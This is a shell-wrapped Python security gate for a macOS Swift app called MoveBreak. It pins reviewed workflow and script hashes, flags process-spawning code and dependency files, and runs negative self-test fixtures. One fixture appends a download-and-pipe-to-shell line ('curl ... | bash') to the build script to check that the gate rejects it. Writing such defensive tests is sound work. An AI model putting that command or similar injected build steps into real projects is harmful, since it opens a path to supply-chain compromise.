#!/bin/bash
# Offline, fail-closed review gate. See ARCHITECTURE.md for allowlist updates.
set -euo pipefail
cd "$(dirname "$0")/.."
exec python3 - "$@" <<'PY'
import hashlib
import os
from pathlib import Path
import re
import subprocess
import sys
import tempfile

# Exact reviewed executable configuration: YAML is deliberately not interpreted with
# an incomplete parser. Any semantic or cosmetic edit requires explicit review.
APPROVED = {
    '.github/workflows/build.yml': '79af25462ca68915350347d8621f59d765b4fe1d5995a514bbb8207405b74786',
    '.github/workflows/release.yml': 'c88bc10c3a24778d86e5c6d24996e31f81e0974fdbce74208f180734ab45f7b4',
    'scripts/build_app.sh': '90ca2c4437228264a817767d5060017469e5147b1b135a8b7cd7319615a56ec4',
    'scripts/check_agent_context.sh': '46e34238f40ef6d8a98800f34156b252c03c5e13ee706ab3a7ec7bfad161befc',
    'scripts/check_architecture_docs.sh': 'f5980a50b85210d23ff7f2adddaa3bf6d0388a642ff8892eb4e81d802d0d0816',
    'scripts/check_documentation.sh': '19111a50a3f0ad954eeb7768c5bd22fe0a44607574884e609a73f47b7190ff0d',
    'scripts/install_login_item.sh': '3896266fb226d7ba7d78aad1bf7995ddf53b10992181a4c46c2fef635d842e29',
    'scripts/test_health.sh': 'dd818ebe23c85d56080583d7e98ed41244151dd65d3b02805981757d35941f84',
}
FRAMEWORKS = {'AppKit', 'SwiftUI', 'Foundation', 'CoreAudio', 'Security', 'CryptoKit', 'Darwin'}
PRIMITIVE = re.compile(r'\b(?:Process\s*\(|executableURL\s*=|dlopen\s*\(|dlsym\s*\(|system\s*\(|popen\s*\(|exec\w*\s*\(|posix_spawn\w*\s*\(|NSAppleScript\s*\()')
# Reviewed lines that create processes, select executables, or execute AppleScript.
SWIFT_PRIMITIVES = {
    'Sources/MoveBreak/BrowserTabInspector.swift': ['guard let script = NSAppleScript(source: source) else {', 'let result = script.executeAndReturnError(&errorInfo)'],
    'Sources/MoveBreak/GroundworkSelfTests.swift': ['failedExitCode = GroundworkSetup.execute(', 'exitCode = GroundworkSetup.execute('],
    'Sources/MoveBreak/GroundworkSetup.swift': ['exit(execute())', 'static func execute('],
    'Sources/MoveBreak/ProcessRunner.swift': ['executor(invocation, timeout)', 'let process = Process()', 'process.executableURL = URL(fileURLWithPath: invocation.executable)'],
    'Sources/MoveBreak/PromptPanel.swift': ['Text(badge).font(.system(.caption, design: .monospaced)).foregroundStyle(.secondary).frame(width: 20)', 'Text(title).font(.system(size: 13, weight: prominent ? .semibold : .regular))'],
    'Sources/MoveBreak/RoutineBuilderWindow.swift': ['.font(.system(size: 10, weight: .semibold))', '.font(.system(size: 13))', '.font(.system(size: 12, weight: .medium))', '.font(.system(size: 10))'],
    'Sources/MoveBreak/RoutineWindow.swift': ['.font(.system(size: 10, weight: .semibold))', '.font(.system(.caption, design: .monospaced)).foregroundStyle(.secondary)', '.font(.system(size: 14))', 'Text(exercise.name).font(.system(size: 12, weight: .medium))', 'Text(exercise.treadmill.badge).font(.system(size: 10)).help(exercise.treadmill.help)', 'Text(label).font(.system(size: 9)).foregroundStyle(.secondary)'],
    'Sources/MoveBreak/UpdateSecurity.swift': ['let executableURL = appURL.appendingPathComponent("Contents/MacOS/\\(expectedExecutable)")'],
    'Sources/MoveBreak/UpdateValidation.swift': ['case executableNameMismatch(expected: String, actual: String)', 'case .executableNameMismatch(let expected, let actual):', 'throw BundleMetadataError.executableNameMismatch('],
}
METADATA = re.compile(r'^(?:Package\.(?:swift|resolved)|.*\.(?:xcodeproj|xcworkspace)|Podfile(?:\.lock)?|Cartfile(?:\.resolved)?|package(?:-lock)?\.json|npm-shrinkwrap\.json|yarn\.lock|pnpm-lock\.yaml|bun\.lockb?|requirements.*\.txt|pyproject\.toml|poetry\.lock|uv\.lock|Pipfile(?:\.lock)?|Gemfile(?:\.lock)?|Cargo\.(?:toml|lock)|go\.(?:mod|sum)|\.env(?:\..*)?)$', re.I)
VENDOR = {'vendor', 'vendored', 'node_modules', 'pods', 'carthage', '.build', '.venv', 'venv', 'third_party', 'third-party', 'packages'}


def git(root, *args):
    return subprocess.check_output(['git', '-C', str(root), *args])


def check(root):
    errors = []
    tracked = set(git(root, 'ls-files', '-z').decode().split('\0')) - {''}
    files = set()
    # Scan ignored/untracked files too; only known generated outputs and Git internals
    # are excluded. Never follow symlinks into another checkout or outside the tree.
    for directory, dirs, names in os.walk(root, followlinks=False):
        relative = Path(directory).relative_to(root)
        for name in list(dirs):
            path = relative / name
            if str(path) in {'.git', 'build', 'MoveBreak.app'}:
                dirs.remove(name)
                continue
            if name.lower() in VENDOR or METADATA.fullmatch(name):
                errors.append(f'{path}: unexpected dependency/vendor directory')
            if (root / path).is_symlink():
                errors.append(f'{path}: directory symlink is not an approved input')
                dirs.remove(name)
        for name in names:
            path = relative / name
            if str(path) == '.git':
                continue
            files.add(str(path))
            if METADATA.fullmatch(name):
                errors.append(f'{path}: unexpected dependency metadata or environment file')
    for name in sorted(files):
        path = root / name
        if path.is_symlink():
            errors.append(f'{name}: symlink is not an approved input')
            continue
        if name.endswith('.swift'):
            if name not in tracked or not re.fullmatch(r'Sources/MoveBreak/[A-Za-z0-9_]+\.swift', name):
                errors.append(f'{name}: unexpected/untracked Swift compiler input; track and inventory it')
            source = path.read_text()
            imports = set(re.findall(r'\bimport\s+(\w+)', source))
            if imports - FRAMEWORKS:
                errors.append(f'{name}: unapproved runtime imports {sorted(imports - FRAMEWORKS)}')
            primitives = [line.strip() for line in source.splitlines() if PRIMITIVE.search(line)]
            if primitives != SWIFT_PRIMITIVES.get(name, []):
                errors.append(f'{name}: executable primitive changed; review fixed executable/argument boundaries')
        executable_surface = (name.startswith(('scripts/', '.github/')) or path.suffix.lower() in {'.sh', '.bash', '.zsh', '.py', '.rb', '.js', '.ts', '.dylib', '.so', '.a', '.framework', '.xcframework'} or bool(path.stat().st_mode & 0o111))
        if executable_surface and name != 'scripts/check_security_surface.sh':
            if name not in APPROVED:
                errors.append(f'{name}: unexpected executable/workflow surface')
    for name, digest in APPROVED.items():
        path = root / name
        if not path.is_file() or path.is_symlink() or hashlib.sha256(path.read_bytes()).hexdigest() != digest:
            errors.append(f'{name}: reviewed security surface changed (Actions must retain full SHA/version comments; permissions, tag validation, secrets, tools and download/execute steps require review)')
    for name in tracked:
        if name.endswith('.swift') and name not in files:
            errors.append(f'{name}: tracked compiler input is missing')
    if errors:
        raise ValueError('\n'.join(errors) + '\nReview the change and update the explicit allowlist AND ARCHITECTURE.md; do not bypass the gate.')



def build_self_test_fixtures(root):
    # Exercise the actual build gate without invoking the compiler or signing tools.
    source = (root / 'scripts/build_app.sh').read_text()
    gate = source.split('echo "==> Running self-test"\n', 1)[1].split(
        'echo "==> Assembling $APP"', 1)[0]
    with tempfile.TemporaryDirectory(prefix='movebreak-build-self-test-') as temporary:
        fixture = Path(temporary)
        executable = fixture / 'build/MoveBreak'
        executable.parent.mkdir()
        for status in (23, 0):
            executable.write_text(
                '#!/bin/bash\n'
                '[ "$#" -eq 1 ] && [ "$1" = "--self-test" ] || exit 99\n'
                'echo "FAIL: representative_case — expected true, got false"\n'
                'echo "additional stderr diagnostic" >&2\n'
                f'exit {status}\n')
            executable.chmod(0o755)
            result = subprocess.run(
                ['bash', '-c', 'set -euo pipefail\n' + gate + '\necho continued'],
                cwd=fixture, capture_output=True, text=True)
            if status:
                assert result.returncode == status, result
                assert not result.stdout, result
                for message in ('representative_case', 'expected true, got false',
                                'additional stderr diagnostic', 'self-test FAILED'):
                    assert message in result.stderr, result
                print('PASS: build self-test failure surfaces case/messages and preserves exit status')
            else:
                assert result.returncode == 0, result
                assert result.stdout == 'continued\n' and not result.stderr, result
                print('PASS: build self-test success stays quiet and continues')


def workflow_self_test_fixtures(root):
    # Pull-request CI must execute the self-test suite explicitly after the build step.
    workflow = (root / '.github/workflows/build.yml').read_text()
    verify = workflow.split('\n  verify:\n', 1)[1].split('\n  release:\n', 1)[0]

    def validate_verify(v):
        import re
        if './scripts/build_app.sh' not in v:
            raise ValueError('verify job must run ./scripts/build_app.sh')
        step_marker = '      - name: Run self-test suite'
        if step_marker not in v:
            raise ValueError('verify job must contain Run self-test suite step')
        step_start = v.index(step_marker)
        build_idx = v.index('./scripts/build_app.sh')
        if step_start <= build_idx:
            raise ValueError('verify job must run ./build/MoveBreak --self-test after the build')
        next_step = v.find('\n      - name:', step_start + len(step_marker))
        step_block = v[step_start:next_step] if next_step != -1 else v[step_start:]
        if 'run: ./build/MoveBreak --self-test' not in step_block:
            raise ValueError('verify self-test step must run ./build/MoveBreak --self-test')
        if re.search(r'^\s+if:\s', step_block, re.MULTILINE):
            raise ValueError('verify self-test step must not have a step-level if condition')
        if re.search(r'^\s*(?:-\s+)?continue-on-error\s*:', v, re.MULTILINE):
            raise ValueError('verify job must not use continue-on-error at job or step level')

    # Validate current workflow
    validate_verify(verify)
    print('PASS: verify job runs the self-test suite explicitly')

    # Negative fixtures
    # Conditional skip
    bad_verify = verify.replace(
        '      - name: Run self-test suite\n        run: ./build/MoveBreak --self-test\n',
        '      - name: Run self-test suite\n        if: ${{ false }}\n        run: ./build/MoveBreak --self-test\n'
    )
    try:
        validate_verify(bad_verify)
        raise AssertionError('conditional self-test step was not rejected')
    except ValueError:
        print('PASS: rejects conditional self-test step')

    # continue-on-error
    bad_verify2 = verify.replace(
        '      - name: Run self-test suite\n        run: ./build/MoveBreak --self-test\n',
        '      - name: Run self-test suite\n        continue-on-error: true\n        run: ./build/MoveBreak --self-test\n'
    )
    try:
        validate_verify(bad_verify2)
        raise AssertionError('continue-on-error step was not rejected')
    except ValueError:
        print('PASS: rejects continue-on-error in self-test step')

    # continue-on-error at job level and on the build step
    for label, old, new in (
            ('job', '    runs-on: macos-14\n', '    runs-on: macos-14\n    continue-on-error: true\n'),
            ('build step', '        run: ./scripts/build_app.sh\n',
             '        continue-on-error: true\n        run: ./scripts/build_app.sh\n')):
        assert old in verify, label
        try:
            validate_verify(verify.replace(old, new, 1))
            raise AssertionError(f'continue-on-error on {label} was not rejected')
        except ValueError:
            print(f'PASS: rejects continue-on-error on verify {label}')

    # Misordered self-test step
    build_and_test_steps = (
        '      - name: Build and self-test with ad-hoc signature\n'
        '        run: ./scripts/build_app.sh\n\n'
        '      - name: Run self-test suite\n'
        '        run: ./build/MoveBreak --self-test\n'
    )
    assert build_and_test_steps in verify
    misordered_steps = (
        '      - name: Run self-test suite\n'
        '        run: ./build/MoveBreak --self-test\n\n'
        '      - name: Build and self-test with ad-hoc signature\n'
        '        run: ./scripts/build_app.sh\n'
    )
    try:
        validate_verify(verify.replace(build_and_test_steps, misordered_steps, 1))
        raise AssertionError('misordered self-test step was not rejected')
    except ValueError:
        print('PASS: rejects self-test step before build')

    # Missing step
    bad_verify3 = verify.replace(
        '      - name: Run self-test suite\n        run: ./build/MoveBreak --self-test\n',
        ''
    )
    try:
        validate_verify(bad_verify3)
        raise AssertionError('missing self-test step was not rejected')
    except ValueError:
        print('PASS: rejects missing self-test step')


def fixtures():
    root = Path.cwd()
    check(root)
    workflow_self_test_fixtures(root)
    build_self_test_fixtures(root)
    cases = [
        ('mutable action', '.github/workflows/build.yml', lambda s: s.replace('actions/checkout@11d5960a326750d5838078e36cf38b85af677262', 'actions/checkout@v4')),
        ('write permission', '.github/workflows/build.yml', lambda s: s.replace('contents: read', 'contents: write', 1)),
        ('verification secret', '.github/workflows/build.yml', lambda s: s.replace('  verify:\n', '  verify:\n    env:\n      TOKEN: ${{ secrets.MACOS_CERT_P12 }}\n')),
        ('release validation', '.github/workflows/release.yml', lambda s: s.replace('Release tag must match vMAJOR.MINOR or vMAJOR.MINOR.PATCH', 'Release tag bypass')),
        ('manifest', 'Package.swift', lambda s: '// unexpected package'),
        ('ignored manifest', 'nested/package.json', lambda s: '{}'),
        ('vendor root', 'vendor/library.txt', lambda s: 'dependency'),
        ('untracked Swift', 'Sources/MoveBreak/Injected.swift', lambda s: 'import Foundation'),
        ('download to shell', 'scripts/build_app.sh', lambda s: s + '\ncurl https://example.invalid/install | bash\n'),
        ('runtime dependency', 'Sources/MoveBreak/main.swift', lambda s: s + '\nimport UnreviewedPackage\n'),
        ('process primitive', 'Sources/MoveBreak/main.swift', lambda s: s + '\nlet injected = Process()\n'),
    ]
    with tempfile.TemporaryDirectory(prefix='movebreak-security-') as temporary:
        fixture = Path(temporary)
        subprocess.run(['git', 'init', '-q', str(fixture)], check=True)
        for name in git(root, 'ls-files', '-z').decode().split('\0'):
            if name and (root / name).is_file():
                target = fixture / name
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_bytes((root / name).read_bytes())
        subprocess.run(['git', '-C', str(fixture), 'add', '.'], check=True)
        check(fixture)
        for label, name, mutate in cases:
            path = fixture / name
            original = path.read_text() if path.exists() else None
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(mutate(original or ''))
            try:
                check(fixture)
            except ValueError as error:
                if name not in str(error) and label != 'vendor root':
                    raise AssertionError(f'{label}: failed for wrong reason: {error}')
                print(f'PASS: rejects {label}')
            else:
                raise AssertionError(f'{label}: gate accepted unsafe fixture')
            finally:
                if original is None:
                    path.unlink()
                    while path.parent != fixture and not any(path.parent.iterdir()):
                        path.parent.rmdir()
                        path = path.parent
                else:
                    path.write_text(original)
        check(fixture)

try:
    if sys.argv[1:] == ['--self-test']:
        fixtures()
    elif sys.argv[1:]:
        raise ValueError('Usage: scripts/check_security_surface.sh [--self-test]')
    else:
        check(Path.cwd())
    print('Security surface matches reviewed offline allowlist.')
except (ValueError, OSError, subprocess.CalledProcessError) as error:
    print(f'security surface check failed: {error}', file=sys.stderr)
    sys.exit(1)
PY
